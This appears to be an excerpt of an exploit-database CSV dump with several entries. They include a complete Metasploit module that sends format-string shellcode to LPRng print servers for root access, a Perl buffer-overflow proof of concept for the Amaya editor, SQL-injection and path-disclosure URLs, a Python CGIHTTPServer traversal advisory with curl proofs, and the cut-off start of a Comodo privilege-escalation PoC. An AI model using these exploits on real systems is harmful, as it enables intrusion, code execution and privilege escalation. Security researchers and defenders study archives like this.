16842,"LPRng - use_syslog Remote Format String (Metasploit) ## # $Id: lprng_format_string.rb 9666 2010-07-03 01:09:32Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Brute 	include Msf::Exploit::FormatString  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'LPRng use_syslog Remote Format String Vulnerability', 			'Description'    => %q{ 					This module exploits a format string vulnerability in the LPRng print server. 				This vulnerability was discovered by Chris Evans. There was a publicly 				circulating worm targeting this vulnerability, which prompted RedHat to pull 				their 7.0 release. They consequently re-released it as ""7.0-respin"". 			}, 			'Author'         => [ 'jduck' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9666 $', 			'References'     => 				[ 					[ 'CVE', '2000-0917' ], 					[ 'OSVDB', '421' ], 					[ 'BID', '1712' ], 					[ 'US-CERT-VU', '382365' ], 					[ 'URL', 'http://www.cert.org/advisories/CA-2000-22.html' ], 					[ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=17756' ], 					[ 'URL', 'http://www.exploit-db.com/exploits/226' ], 					[ 'URL', 'http://www.exploit-db.com/exploits/227' ], 					[ 'URL', 'http://www.exploit-db.com/exploits/230' ] 				], 			'Platform'       => 'linux', 			'Arch'           => ARCH_X86, 			'Privileged'     => true, # root 			'DefaultOptions' => 				{ 					'PrependSetresuid' => true 				}, 			'Payload'        => 				{ 					'Space'    => 130, # buffer size on caldera is 180! (need ~50 for fmt) 					'BadChars' => ""\x00\x0a\x20\x25"", 				}, 			'Targets'        => 				[ 					# tested OK - jjd 					[ 'Caldera OpenLinux 2.3 Bruteforce', 						{ 							'Platform'   => 'linux', 							'NumPops'    => 243, 							'FlowHook'   => 0x80992d4,  # GOT of exit 							# (0x809c180+(41+4+10+48)) - data segment, but gets corrupted 							'Bruteforce' => 								{ 									'Start' => { 'Ret' => 0xcffffff4 }, 									'Stop'  => { 'Ret' => 0x7fffe004 }, 									'Step'  => 16 								} 						} 					], =begin 					# untested (from public exploits) 					[ 'Slackware 7.0 LPRng-3.6.22.tgz - started from shell', 						{ 							'NumPops' 	=> 299, 							'Ret' 	   => 0xbffff640, 							'FlowHook'	=> 0xbfffee30 						} 					], 					[ 'RedHat 7.0 (Guinness) with LPRng-3.6.22/23/24-1 from rpm - glibc-2.2-5', 						{ 							'NumPops' 	=> 304, 							'Ret' 	   => 0xbffff920, 							'FlowHook'	=> 0xbffff0f0 						} 					], 					[ 'RedHat 7.0 - Guinesss', 						{ 							'NumPops' 	=> 300, 							'Ret' 	   => 0x41424344, 							'FlowHook'	=> 0xbffff3ec 						} 					], 					[ 'RedHat 7.0 - Guinesss-dev', 						{ 							'NumPops' 	=> 300, 							'Ret' 	   => 0x41424344, 							'FlowHook'	=> 0xbffff12c 						} 					], =end 					# ... 					[ 'Debug', 						{ 							'NumPops' 	=> 1, # sure to miss. 							'Ret' 	   => 0x41424344, 							'FlowHook'	=> 0x45464748 						} 					] 				], 			# 'DefaultTarget' => 0, 			'DisclosureDate' => 'Sep 25 2000'))  		register_options( [ Opt::RPORT(515) ], self.class ) 	end   	def exploit 		# we want to use DPA for this one :) 		fmtstr_set_caps(false, true)  		# check syslog to see which number hits 41414141 =begin 		400.times { |x| 			connect 			buf = ""aAAAABBBB|%%%u$x|%u\n"" % [x+1, x+1] 			sock.put(buf) 			#handler 			disconnect 		} =end 		print_status(""Trying target #{target.name} .."")  		super 	end   	def brute_exploit(addrs)  		#print_status(""Trying target #{target.name} - addr 0x%x..."" % addrs['Ret'])  		printed = ""Service_connection: bad request line '\\35"" # + ""'XXXYYYYZZZZ... 		num_start = printed.length + 2 + 4  		# write 'ret' addr to flowhook (execute shellcode) 		# NOTE: the resulting two writes must be done at the same time  		# characters (chr(10) > X > chr(99)) will screw up alignment (\XXX in syslog) 		fmtbuf = ""_"" * 4 		fmtbuf << generate_fmt_two_shorts(num_start, target['FlowHook'], addrs['Ret']) 		#print_status("" hijacker format string buffer is #{fmtbuf.length} bytes"")  		# append payload and newline 		#fmtbuf << payload.encoded 		fmtbuf << ""\x90"" * 32 		fmtbuf << Rex::Text.charset_exclude(payload_badchars) 		fmtbuf << ""\n""  		print_status("" writing 0x%x to 0x%x"" % [addrs['Ret'], target['FlowHook']])  		connect 		#print_status(""Sleeping, attach now!!"") 		#select(nil,nil,nil,5)  		sock.put(fmtbuf)  		handler 		disconnect  	end  end   =begin  HRM!  The following causes info leakage!  bash$ ( ruby -e 'puts ""\x09"" + (""%x"" * 50) + ""\n""'; cat) | nc 192.168.0.120 515 | hexdump -vC  There are various other ways to trigger the vulnerability. LPD uses the single-byte commands 0x01 -> 0x09...  It's unclear if there is a way to auto-detect the lpd version via LPD commands.  =end",.cert.,0
22087,Mambo Site Server 4.0.11 - Full Path Disclosure source: https://www.securityfocus.com/bid/6387/info  A vulnerability has been discovered in Mambo Site Server. Requesting the 'index.php' script with an invalid parameter will cause an error page to be generated containing the path of the Mambo script.  Information obtained by exploiting this issue may aid an attacker in launching further attacks against a target server.  It should be noted that this vulnerability was reported in Mambo Site Server 4.0.11. It is not yet known whether other versions are affected.  http://www.example.com/mambo/index.php?Itemid=invalidparameter,Mambo,1
7906,"Amaya Web Editor 11.0 - Remote Buffer Overflow (PoC) #!/usr/bin/perl -w # Amaya Web Editor <= 11.0 Remote Buffer Overflow P0c   # By Mountassif Moad (Stack) # Here D : http://www.w3.org/Amaya/Distribution/amaya-WinXP-11.0.exe # EAX 00000001 # ECX 0F866A64 # EDX 0083AA64 amaya.0083AA64 # EBX 00000000 # ESP 0012D080 # EBP 00000006 # ESI 0B425D00 # EDI 0085AD9C ASCII ""src"" # EIP 44444444  print ""===================================================================== \n""; print ""Author : Stack            \n""; print ""===================================================================== \n""; my $code =""<html>"".""\n"".          '<bdo dir=""'.""\n""; my $bof = ""\x41"" x 160; my $bof2 = ""\x43"" x 8; my $bof3 = ""\x44"" x 4; my $coding ='"">'.""\n"".              ""Heap</bdo>"".""\n"".             ""</html>""; my $file=""St_.html""; $exploit = $code.$bof.$bof2.$bof3.$coding; open(my $FILE, "">>$file"") or die ""Cannot open $file: $!""; print $FILE $exploit ; close($FILE); print ""$file has been created \n"";  # milw0rm.com [2009-01-29]",Amaya,1
25664,"Shop-Script - ProductID SQL Injection source: https://www.securityfocus.com/bid/13635/info  Shop-Script is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/index.php?mark=5&productID='[SQL inj] http://www.example.com/index.php?productID='[SQL inj]",webasyst,1
33894,"Python CGIHTTPServer - Encoded Directory Traversal Advisory: Python CGIHTTPServer File Disclosure and Potential Code           Execution  The CGIHTTPServer Python module does not properly handle URL-encoded path separators in URLs. This may enable attackers to disclose a CGI script's source code or execute arbitrary CGI scripts in the server's document root.  Details =======  Product: Python CGIHTTPServer Affected Versions:   2.7 - 2.7.7,   3.2 - 3.2.4,   3.3 - 3.3.2,   3.4 - 3.4.1,   3.5 pre-release Fixed Versions:   2.7 rev b4bab0788768,   3.2 rev e47422855841,   3.3 rev 5676797f3a3e,   3.4 rev 847e288d6e93,   3.5 rev f8b3bb5eb190 Vulnerability Type: File Disclosure, Directory Traversal, Code Execution Security Risk: high Vendor URL: https://docs.python.org/2/library/cgihttpserver.html Vendor Status: fixed version released Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2014-008 Advisory Status: published CVE: CVE-2014-4650 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4650   Introduction ============  The CGIHTTPServer module defines a request-handler class, interface compatible with BaseHTTPServer. BaseHTTPRequestHandler and inherits behavior from SimpleHTTPServer. SimpleHTTPRequestHandler but can also run CGI scripts.  (from the Python documentation)   More Details ============  The CGIHTTPServer module can be used to set up a simple HTTP server with CGI scripts. A sample server script in Python may look like the following:  ------------------------------------------------------------------------ #!/usr/bin/env python2  import CGIHTTPServer import BaseHTTPServer  if __name__ == ""__main__"":     server = BaseHTTPServer.HTTPServer     handler = CGIHTTPServer.CGIHTTPRequestHandler     server_address = ("""", 8000)     # Note that only /cgi-bin will work:     handler.cgi_directories = [""/cgi-bin"", ""/cgi-bin/subdir""]     httpd = server(server_address, handler)     httpd.serve_forever() ------------------------------------------------------------------------  This server should execute any scripts located in the subdirectory ""cgi-bin"". A sample CGI script can be placed in that directory, for example a script like the following:  ------------------------------------------------------------------------ #!/usr/bin/env python2 import json import sys  db_credentials = ""SECRET"" sys.stdout.write(""Content-type: text/json\r\n\r\n"") sys.stdout.write(json.dumps({""text"": ""This is a Test""})) ------------------------------------------------------------------------  The Python library CGIHTTPServer.py implements the CGIHTTPRequestHandler class which inherits from SimpleHTTPServer.SimpleHTTPRequestHandler:  class SimpleHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler): [...]     def do_GET(self):         """"""Serve a GET request.""""""         f = self.send_head()         if f:             try:                 self.copyfile(f, self.wfile)             finally:                 f.close()      def do_HEAD(self):         """"""Serve a HEAD request.""""""         f = self.send_head()         if f:             f.close()      def translate_path(self, path):     [...]         path = posixpath.normpath(urllib.unquote(path))         words = path.split('/')         words = filter(None, words)         path = os.getcwd()         [...]  The CGIHTTPRequestHandler class inherits, among others, the methods do_GET() and do_HEAD() for handling HTTP GET and HTTP HEAD requests. The class overrides send_head() and implements several new methods, such as do_POST(), is_cgi() and run_cgi():  class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): [...]     def do_POST(self):         [...]         if self.is_cgi():             self.run_cgi()         else:             self.send_error(501, ""Can only POST to CGI scripts"")      def send_head(self):         """"""Version of send_head that support CGI scripts""""""         if self.is_cgi():             return self.run_cgi()         else:             return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)      def is_cgi(self):         [...]         collapsed_path = _url_collapse_path(self.path)         dir_sep = collapsed_path.find('/', 1)         head, tail = collapsed_path[:dir_sep], collapsed_path[dir_sep+1:]         if head in self.cgi_directories:             self.cgi_info = head, tail             return True         return False [...]     def run_cgi(self):         """"""Execute a CGI script.""""""         dir, rest = self.cgi_info          [...]          # dissect the part after the directory name into a script name &         # a possible additional path, to be stored in PATH_INFO.         i = rest.find('/')         if i >= 0:             script, rest = rest[:i], rest[i:]         else:             script, rest = rest, ''          scriptname = dir + '/' + script         scriptfile = self.translate_path(scriptname)         if not os.path.exists(scriptfile):             self.send_error(404, ""No such CGI script (%r)"" % scriptname)             return         if not os.path.isfile(scriptfile):             self.send_error(403, ""CGI script is not a plain file (%r)"" %                             scriptname)             return         [...] [...]  For HTTP GET requests, do_GET() first invokes send_head(). That method calls is_cgi() to determine whether the requested path is to be executed as a CGI script. The is_cgi() method uses _url_collapse_path() to normalize the path, i.e. remove extraneous slashes (/),current directory (.), or parent directory (..) elements, taking care not to permit directory traversal below the document root. The is_cgi() function returns True when the first path element is contained in the cgi_directories list. As _url_collaps_path() and is_cgi() never URL decode the path, replacing the forward slash after the CGI directory in the URL to a CGI script with the URL encoded variant %2f leads to is_cgi() returning False. This will make CGIHTTPRequestHandler's send_head() then invoke its parent's send_head() method which translates the URL path to a file system path using the translate_path() method and then outputs the file's contents raw. As translate_path() URL decodes the path, this then succeeds and discloses the CGI script's file contents:  $ curl http://localhost:8000/cgi-bin%2ftest.py #!/usr/bin/env python2 import json import sys  db_credentials = ""SECRET"" sys.stdout.write(""Content-type: text/json\r\n\r\n"") sys.stdout.write(json.dumps({""text"": ""This is a Test""}))  Similarly, the CGIHTTPRequestHandler can be tricked into executing CGI scripts that would normally not be executable. The class normally only allows executing CGI scripts that are direct children of one of the directories listed in cgi_directories. Furthermore, only direct subdirectories of the document root (the current working directory) can be valid CGI directories.  This can be seen in the following example. Even though the sample server shown above includes ""/cgi-bin/subdir"" as part of the request handler's cgi_directories, a CGI script named test.py in that directory is not executed:  $ curl http://localhost:8000/cgi-bin/subdir/test.py [...] <p>Error code 403. <p>Message: CGI script is not a plain file ('/cgi-bin/subdir'). [...]  Here, is_cgi() set self.cgi_info to ('/cgi-bin', 'subdir/test.py') and returned True. Next, run_cgi() further dissected these paths to perform some sanity checks, thereby mistakenly assuming subdir to be the executable script's filename and test.py to be path info. As subdir is not an executable file, run_cgi() returns an error message. However, if the forward slash between subdir and test.py is replaced with %2f, invoking the script succeeds:  $ curl http://localhost:8000/cgi-bin/subdir%2ftest.py {""text"": ""This is a Test""}  This is because neither is_cgi() nor run_cgi() URL decode the path during processing until run_cgi() tries to determine whether the target script is an executable file. More specifically, as subdir%2ftest.py does not contain a forward slash, it is not split into the script name subdir and path info test.py, as in the previous example.  Similarly, using URL encoded forward slashes, executables outside of a CGI directory can be executed:  $ curl http://localhost:8000/cgi-bin/..%2ftraversed.py {""text"": ""This is a Test""}   Workaround ==========  Subclass CGIHTTPRequestHandler and override the is_cgi() method  with a variant that first URL decodes the supplied path, for example:  class FixedCGIHTTPRequestHandler(CGIHTTPServer.CGIHTTPRequestHandler):     def is_cgi(self):         self.path = urllib.unquote(self.path)         return CGIHTTPServer.CGIHTTPRequestHandler.is_cgi(self)   Fix ===  Update to the latest Python version from the Mercurial repository at http://hg.python.org/cpython/   Security Risk =============  The vulnerability can be used to gain access to the contents of CGI binaries or the source code of CGI scripts. This may reveal sensitve information, for example access credentials. This can greatly help attackers in mounting further attacks and is therefore considered to pose a high risk. Furthermore attackers may be able to execute code that was not intended to be executed. However, this is limited to files stored in the server's working directory or in its subdirectories.  The CGIHTTPServer code does contain this warning: ""SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL"" Even when used on a local computer this may allow other local users to execute code in the context of another user.   Timeline ========  2014-04-07 Vulnerability identified 2014-06-11 Customer approved disclosure to vendor 2014-06-11 Vendor notified 2014-06-15 Vendor disclosed vulnerability in their public bug tracker            and addressed it in public source code repository 2014-06-23 CVE number requested 2014-06-25 CVE number assigned 2014-06-26 Advisory released   References ==========  http://bugs.python.org/issue21766   RedTeam Pentesting GmbH =======================  RedTeam Pentesting offers individual penetration tests, short pentests, performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately.  As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security related areas. The results are made available as public security advisories.  More information about RedTeam Pentesting can be found at https://www.redteam-pentesting.de.   --  RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0 Dennewartstr. 25-27                       Fax : +49 241 510081-99 52068 Aachen                    https://www.redteam-pentesting.de Germany                         Registergericht: Aachen HRB 14004 Geschäftsführer:                       Patrick Hof, Jens Liebchen",CGIHTTPServer,1
39508,"Comodo Anti-Virus - 'SHFolder.dll' Local Privilege Escalation <#                                                      ````......````                                                                                                            ``,;''''''''''''''''';,`                                                                                                    .;''''''''''''''''''''''''''',`                                                                                            `:''''''''+';:,.``````.,:;'''''''''':`                                                                                       ,;'''''';,.`                  ``,;'''''';:                                                                                  `:'''''',.                            `,'''''';.                                                                             `;+''+':`                  ,;              `,''''';.                                                                         `;'''';.             ``    .:;'` `.             `;'''''.                                                                   `  :+''';`          `,``:+''   ';;'`,'';  ``   ``      :'''';`                                                                  .'''';`           ,';' '':'`  ';,'`'',' :''' .''`       :'''',                                                               `;''''`         ;'' :+.` ;';,   ';:' ''''`,;:+ '',         `;''''`                                                            .''''.     ;:`, .'.':`'''.:;`;.  +;:' '::; ;''' ';            .'''',                                                          :''';`   `  '''',`':'' ..;:`','`  '''' ':;;`'`';`':`   :;        :''';                                                        ;''+,     .;`.'.'' ';.'`';': ,:. `  ` ` `,: .';',,'`;'.`';':       .+'''`                                                    `''''`      ;'; ''.'.,','` ,`                  ``;`''  .`;'`''+:       ;'''`                                                  `''''    .,  .'' ,'.'' ;;.         ````````         `.  ``'::'`;; `      :'''.                                               ``''':    `+,`  .':`'','        `,;''''''''''+'':.`        ;'.+:;'``':      .'''.                                              `''',      '',   ''`:;      `:'''''''''''''''''''''';.      `;'`': ''`'`     .''',                                            `''',   `   `''`  `';     .''''''''''''''''''''''''''''';`    `.;' ;'.''`.:    `''',                                          `''',     :''.`''   `    ,;'''''''''''''''''''''''''''''''';. `  `,.'::', ''`    .'''.                                         ''',      '.''`,':     ,'''''''''''''''''''''''''''''''''''''', `  .+,'; '';      .'''`                                       ''':       ''`'' ;.   `'''''''''''''''''';:::;';'''''''''''''''''.    ;' :': ,,`    .'''                                      :'';        `''.'`  ` :''''''''''''';:::.',   `''';`:;'+'''','''''+;    `,'; :'''     ,'''                                    .'''     ``   .++;   `''''''''''''`.     `':    ''';    `:''' :'''''''.   .+ :''.+.     :'':                                  `''+     :'':   ``   ,'''''''''''''       `':    ''';       `: ,'''''''':   .`''.''   `   '''`                                 ;''.    `+.',;      ;'''':''''''''; `      ',  .'''':       `  :''''';''';   `'.',`,',    `+''                                ,'':      '';,'.    ;''''':''''''''`+`      ;..`;'+''.        '.:''''';'''''```.+'  +:'`    .'';                              `'''    `;``+',;.`  ;''''':''''''''.';      `;'',    '`        '' ;''''','''''`    ;,+.+.     ;''.                             ;'+.    :'': ;':   ;'''''':''''':',''.      `'';.+'  '`        ,'; .'''';''''''`  `+.':`      `'''                            `'':    .+`;''` `  ;'''''':''''''.::''.      .''.     ::        `'';`,'''':''''''`  :+'.        ,'',                           '''`    :''.:''   :''''''':'''''; :''''      .'',   `.,;     :+'`''': ;''','''''''   ,`          '''                          .'':      `'';``  ,''''''':;''''':`''';',     ,''+` ,+':'     +'''''''`,''''''''''';         .+`  .'':                         '''    `''. :',  `''''''':`'''''+.;';.:::::::,,''';`'': .     .'''''''; ''''.''''''',    `  ;'':   '''                        .'',    ','';`.   '''''''; :'''''' `,;'''''''''.```   .   ''''';:,`:;''+`'''',,'''''''`    :'';`    `+':                       '''`    ''.,';   ;'''''';  ''''',`,'''''''''''''.....,,,.`''''''''';;,,;.''''; :'''''''   '''.       ;''                      `'':     .'';:;  `'''''''` .+'', ,'''''''''''';  '''''''++`''''':..:'''' `'''''  ;'''''',  .,    ``   .'',                   ` :''        :''`  ''''''+`  ;''``;'''''''''''''':``,,.`````,'''''.       ';.;'''` `'''''''`      .++.   '';                     +''             ,'''''':   ;+`,'''''''''''''''''+''';;;;'''''''+`       :;+,`''. `.'''''';    .+'''`   :'+`                   ,''.    ':       +''''';    ,,;''''''''''''''''''''''''''''''''''.  `.::,` `';.',   ;''''''`  :'':  `.  `'';                   ;''    :;.;':   ,''''''.    `''''';;;,`.:'''''''''''''''''''''''''.;''''''':`;;;,   `''''''; `.;  .;'+`  ;''                   '': `  ;';';'   '''''';     ''';;''''''',`.'',`   .:;;''''''''''.,'''''''''''.;;.    ,''''''   `;''''.   .''`                 .''.    .';`;'  .''''''.    :+;;''''''''''': ;'    ::::...;''+'':,'''';..``;''';.      ''''''; `:''.`':   `'':                 :''     `  ,'`  ;''''''.    :;'''''''''''''';`;,               `,''';` .:;;;'''':      ,''''''   .,''',    '''                 ;';    ''';,`  `''''''''''` :''''''''''';.:'''`';:`            ,''';`;''''''''''',      ''''''.  ;';,`     :''`               `'',   .;,''';  ,'''''''''' ;'''''''''':`   :'''`::`          ``'''',+''''''''''''+`     ;''''';  .``.:;`   `''.               .''`   `+;'`;`  '''''''''';.'''''''',`       ''';`             :''';'''';::;'''''';;   ` `''''''`  ;'';;;   `+':               :''     ..;''  `''''''''''`'''''''',         .'''`            `+''';''.     ,'''''''''''''''''''''''''''''''''''''':`          ;''    :.  ``  .'''''''''';''''''''           ;'';            ;''':::`       :'''''''''''''''''''''''''''''''''''''''',        ;':    '''':`  :'''''''''''''''''',`          .'''            ''''.          `+'''''''''''''''''''''''''''''''''''''''''       '',    :,;'':  ;''''''''''''''''''`            ;''...        :''''`           :''''''''''''''''''''''''''''''''''''''''''`    `''.   `+'':,`  '''''''''''''''''';             ,'';.+`     . ,;'''            `'''''''''''''''''''''''''''''''''''''''''';    .''.   `.,;';   '''''''''';''''''',              ''',+. `` .'  .'''             ''''''''+'''''''''''''''''''''''''''''''''',   .'+`   ;'''''          ``  '''''''`             `;''''.'++','`+.'''             '''''';                            `;+''''''   ,''                        ''''';;               ,'''';'''';'``.'''             :''''''`                             .'''''':  :'+                        '''''':               .'''';'''';'` .'''             ,''''''`                              ,''''';  :''            ,''''',     ''''''`               .'''';'''';', .'''`            .''''''`                               ''''''  ;''  `'''''';  :''''',     ''''''                .'''';'''';':,''''.            .''''''`                               ''''''  ;''  `';'''''  :''''',     :'''';                :''''''''';''.'''''            `''''''`                               ;'''''  ;''            :''''',     ,'''''               `+''''''''':''.'''''`           ,''''';                                ''''''  :'+            ,''''',     `'''''.              ,'''''''''':''::'''';           ;''''':                               `''''''  :''      ```.  ,''''':      ''''':             `''''''''''',''+`'''''.         `''''''.                               :''''''  ,''` `'''''''  .''''';     `''''':             '''''''''''';''',,''''',        '''''''                               ,'''''',  .''` `''':,.;  `''''''     `'''''':           '''''''''''''';'''`'''''':.   `,''''''',                             .''''''''   `''`  `,;;;''`  ''''''     `'','''';,`     `,''''''''''''''',''':.''''''''''''''''''':`     ;'''''''''''''''''''''''''''''',    '',   `+';;,   ''''''     `''`,'''''''''''''''''''''''''''':''''.:''''''''''''''''',+      '''''''''''''''''''''''''''''';     '':   `   `,.  ;'''''.    `''' .''''''''''''''''''''''''''''.''''`;''''''''''''''':;;     `''''''''''''''''''''''''''';';      ;';    ,'''';  :''''':    `''''``'''''''''''''''''''''''''''`:''''`;''''''''''''';,',     ,'''''''''''''''''''''''''''';       ;''    ';;,..  .''''''    `''';;  :''''''''''''''''';'''''''. '''''`;'''''''''''';+'`     ;'''''''''''''''''''''''''';.        :''   `,:;'''   ''''''`   `'''`';` `;'''''';,''''''';''''''', .'''''..''''''''''''+:      '''''''';''''''''';''''';,`          .''.   .''',`   ;''''': `  ''':;''.  ````` :+'''''',;''''''',  '''''';..;''''''''''`     `''''''    `,'':   `+':                '':    `  .;.  ,'''''+    .'';,'''''''';:''''''''','''''''':  ;'''''''''.`,'''''''      ;''''';  ,'',      .''.                '';     :+.++` `''''''.   +'''`'''''''''''''''''''.''''''''', .''';;'':,,'''''''',      ''''''.  ':''',    :''`                :''    ,';:.'.  ;''''''   ''''.:''''''''''''''''';;'''''''''''.'''.  `:;'''''':'':     :''''''   ';,.:'    '''                 .''.   .;:'''   .''''''` ,'''':`''''''''''''''''':''''''''''';''''.`;'''''''''.'''',   '''''':   ,'''',   `'':                  '';    ;';, ;`  '''''';.+''''' ''''''''''''''''':''''''''''': :'':'''''''''',;''''': :'''';'   ,. .;:    ,''`                  ;''       `;', `,'''''''''''''.,'''''''''''''';','''';:.``   `,.;'''''''''''.+''''''.'''''';  ,'+'.      '''                   .''.    '''';`   ''''';''''''';`'''''''''''''':.'';:,;'''':`  ,:`:''''''''','',`:''':''''''`  '.:'''    `'':                    '''   :'': `:.  ,'''';;'''''''`;'''''''''''',:';`:'',,``.:'. `':`+''''''';:'',':';.'''''';  `'''..'    :''                     :''`  `,. ;:++`  ''''';,'''''';`''''''''''';;',.''....,.. ,';:.'.`'''''''.'''','';+''''''  ;. ,+''`    '';                     `'':    `'',`;:  `'''''',''''''.:''''''''''`+.,';:''''''';.:''':'`,''''''`'''':''''''''', :':;` ,'    ,'',                      ;''`   `+.''+` ` :'''''','''''' '''''''''' `.'''''''''''''::'''', +'''':,''''`;''''''''  +.''+;      '''                       `'':    ;'';` `   ''''''':''''';`'''''''',  '''''''''''''''.,''''`''''',:''''`,'''''''`  '''.:';    .'':                        ''+`    ,`  ,+:  `'''''','''''':`'''''''` :''''''''''''';   ;'''`+''''`;'''':+''''''.` ` :'':;,    '''                         .'':     ;';''.   .'''''';'''''',`'''''+  ''''''''''''''`  .,'';.''''' '''''''''''':   +'``;';    .'',                          ''+`    :''; ,'`  :''''','''''''.,''''' ,''''''''''''''  :''''';''''','''';'''''';   ,.''. .``   '''                           `';;    `+. ;'':'  :''''':'''''''.:'''; ;''''''''''''': `'''''''''''.'''''.''''''   :';`'';     :''.                            :'',`    `'':.''`  ;'''';;:''''''`'''; '''''''''''''': .'''''''''''.''',;''''''   ` :''.'''`  `'''                              '''     ;'.:''`    ;''''';:''''':''';.'';''''''''''': ,'''''''''':;'':+''''''`  .''``'+',:   '''`                              .';;    `;;';   `   :''''':'''''';'''`'';''''''''''': ,''''''''''`''';''''';    .,''` :`    ,'':                                ;'',    `',   `'.   ,''''';''''';'''''':''''''''''': .''''''''',`+';,'''';    ``.''';    ``'''                                  '''`        `'';: ` .'''':'''''`'''''';;''''''''''; `'''';'''',.`''+,'',   ,'`:'''''`    '''`                                  .'''        ;'.''    `;''''''''.''''''':'''';:,''';. ,''';''''',;'''',`   `;''''''';.   ;'',                                    ,'';      ''.;',      ,';''''';,''''''`+,`   .;:;''',,'';'''+.;''''',```:+,''''''''''.:'';                                      ;'';    ''';',   '.   `,''''''.'''''' `.:;'+''''+''';.,.''':,''''''` ``'''''''''''''',''                                        ''':   .,,':   :':    +''''''',''';.:'+,.`     `.:''':`''''''''''; `'':'''''''''''''',`                                         ''':     `   .''  `'`;'''''''..,.:+,`   ``.,.`    ,'''`;'''''''+.';'.:'''':;'''''+:.'`                                          ''':     ;:`+'`  ,:..,''''''; .+:   `:'+''''';`    ;'; .''''': `:';:+''';`''''''. .':                                          `''';    ; ;'.    .';'`;'''',;'.   .+''''''''''`    ;;'+:'''; .+'''''''';''''''.;,'';                                           `''''    ,';     :'`'`;'''':+`   `'''''''''''':     ;'';'''`;''''''''''''''''',.''';                                            `''''  ` `      `':. ';''.+.    `'''''''''''';     `'''''::'''.'''',`'''''': :';;''                                              ''''.        :;,'`:'.';',      '''''''''''':      ,'''','''..''': '''';;:,''. `''                                               :''':      `.+'' '''','       :''''''''''+.       ''''''':`'''' .''';:;`.'.:' ';                                                ,''''`      `,` ',;:'. `;;;,``'''::::;''; :';,   ,'''''' ;'''` +'''.''+'.:'+`':                                                 `'''':      `  ;'':'  '''''+;.;  ``  ,:`''''',  `'''''`,'''' :'''.''''..''','.                                                   :''''.        .,': :'''''''.`;'''';` .''''''`  '''':`+'''``''',;'''``''';:'.                                                    `'''''`      `.'` ''''''';`'''''''': ,''''';  ;'''`''''; ''';:'''. ;''',''                                                       ,'''''`    `.'` '''''''.'''''''''', +'''''` ,'';.''''`''''`+''' ,''''`.:                                                         :''''',   .'  '''''''.'''';:.,'''`''''''. .''''''':.''',;'''``;,',' '.                                                          `:+'''';..;  '''''':,''':'''.:''.'''''': `'`''''' ''''`''': ' ::.:`+                                                             `,''''':'  ''''''::''+`''',;''.;''''', `'.'''';`'''.;'''`:.,+`'`,:                                                                .;+':'  '''''';.''''';`,'''.''''''` `'.''''.,'''`'''.`;`+;`' +                                                                    .:+` '''''''`''''''+'''+.''''';  .' ;''' ;''.;,'' ' ''.:``:                                                                      '. :'''''':.+'''''''',;''''',  ;: ;''; '''.'.,;,,:'' '`'                                                                       ;; `'''''''``;'''''',`,'''''  `'` ''',.''',.:;`' ''.,.`;                                                                       .+  ''''''' ` `.,,.`'; ''';   :; `''+`;'';;: :.;`',`; ;`                                                                        +: `'''''``';;;;;'''', ``   `+. `''' '''::;;:;`;'`;..,                                                                         ,'  ``.. `+''''''''''+`     :'  `'';`''':. ,.',''.; '                                                                          `+'      :'''''''''''',    `+.`  '',.''',. :,''''+ ;                                                                            .',     ;''''''''''''.    ':    ''.,''':` ;.''''.,.                                                                             :'.    :''''''''''',    ;'`    ''.:''',':;.''':.:                                                                               ''.     ,:''''',`     ;+`     :'.:'''' ':`''; ;                                                                                `'',                 ''.       ::,''''``; :, '                                                                                   ;+;`             .'+`         ``'':'`,;   '``                                                                                   ,'';.        `.'';`            :';'.,;  '.                                                                                      `,''';:::::;'''.                ``+;' +`                                                                                          `,:''''';,`                     ,,;                                          SHFolder.DLL Local Privilege Elevation Exploit for Comodo Anti-Virus GeekBuddy Component by @Laughing_Mantis (Greg Linares)  Since it took 146 days to fix a DLL Hijack issue I decided to drop this PoC:  ###Technical Geeky Stuff###  GeekBuddy stores several helper applications within the C:\ProgramData\Comodo\lps4\temp folder. These binaries are individual components of the Comodo Security Suite and are executed whenever their related function is performed, updated, or uninstalled.  The directory listing is as follows: 10/06/2015  12:08 AM    <DIR>          . 10/06/2015  12:08 AM    <DIR>          .. 10/02/2015  10:43 PM                27 download.cfg 10/02/2015  10:47 PM           637,864 setup_clps_application_vulnerability_monitor_release-4.10.307677.9.exe 10/02/2015  10:44 PM         2,196,272 setup_clps_autoruns_manager_api_release-4.14.330616.6.exe 10/02/2015  10:44 PM           547,088 setup_clps_boot_time_monitor_release-4.12.315371.9.exe 10/06/2015  12:07 AM         1,014,024 setup_clps_browser_addons_api_release-4.0.292287.4.exe 10/02/2015  10:44 PM           554,240 setup_clps_browser_addons_monitor_release-4.12.315370.6.exe 10/06/2015  12:06 AM           950,864 setup_clps_client_transaction_release-4.19.365037.89.exe 10/06/2015  12:08 AM           563,896 setup_clps_cross_selling_installer_monitor_release-4.12.318569.13.exe 10/02/2015  10:43 PM           768,032 setup_clps_cspm_alert_monitor_release-4.19.360508.5.exe 10/06/2015  12:08 AM           581,432 setup_clps_immaturely_closed_sessions_monitor_release-4.21.366534.6.exe 10/02/2015  10:47 PM           459,432 setup_clps_memory_monitor_release-4.10.301764.3.exe 10/02/2015  10:46 PM         1,152,480 setup_clps_system_cleaner_api_release-4.2.292287.3.exe 10/06/2015  12:07 AM         1,989,272 